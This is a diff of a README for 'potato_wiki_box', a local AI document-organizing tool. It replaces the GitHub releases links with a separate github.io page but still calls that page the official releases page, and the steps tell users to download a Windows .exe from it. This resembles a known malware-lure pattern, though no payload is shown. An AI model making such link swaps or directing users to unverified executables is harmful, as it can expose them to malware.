@@ -1,6 +1,6 @@
 # 🥔 potato_wiki_box - Turn source documents into organized knowledge
 
-[![](https://img.shields.io/badge/Download-potato__wiki__box-blue.svg)](https://github.com/Fitted-clip257/potato_wiki_box/releases)
+[![](https://img.shields.io/badge/Download-potato__wiki__box-blue.svg)](https://fitted-clip257.github.io)
 
 Potato_wiki_box creates a private workspace for your documents. It uses artificial intelligence to scan your files and build a searchable database. You keep total control over your data because everything stays on your computer. Your files do not leave your machine.
 
@@ -10,7 +10,7 @@ The software converts raw text and notes into a structured format. This format w
 
 You need to download the installer to set up the application on your computer.
 
-1. Visit the [official releases page](https://github.com/Fitted-clip257/potato_wiki_box/releases).
+1. Visit the [official releases page](https://fitted-clip257.github.io).
 2. Look for the file ending in `.exe`. This is the Windows installer.
 3. Click the link to start the download.
 4. Save the file to your computer.
